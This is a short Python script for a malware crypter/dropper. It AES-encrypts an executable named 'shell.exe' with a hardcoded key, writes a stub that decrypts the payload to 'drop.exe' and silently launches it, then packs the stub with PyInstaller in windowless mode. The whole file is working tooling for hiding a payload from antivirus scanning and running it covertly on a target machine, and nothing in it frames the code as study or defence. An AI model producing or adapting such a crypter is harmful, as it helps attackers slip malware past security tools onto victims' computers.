import pyaes
import os

# KEYS
KEY = b"0123456789123456"
stub_name = "stub.py"
exe_path = "shell.exe"
dropfile_name = "drop.exe"

# READ FILE
with open(exe_path, "rb") as file:
    executable = file.read()

encrypt_data = pyaes.AESModeOfOperationCTR(KEY).encrypt(executable)

# STUB
stub = f"""
import pyaes
import subprocess
dropfile_name = '{dropfile_name}'

KEY = {KEY}
encrypt_data = {encrypt_data}
decrypt_data = pyaes.AESModeOfOperationCTR(KEY).decrypt(encrypt_data)
with open(dropfile_name, "wb") as file:
    file.write(decrypt_data)

proc = subprocess.Popen(dropfile_name)
"""
#STUB WRITE
with open("stub.py", "w") as file:
    file.write(stub)

os.system("pyinstaller -F -w --clean {}".format(stub_name))
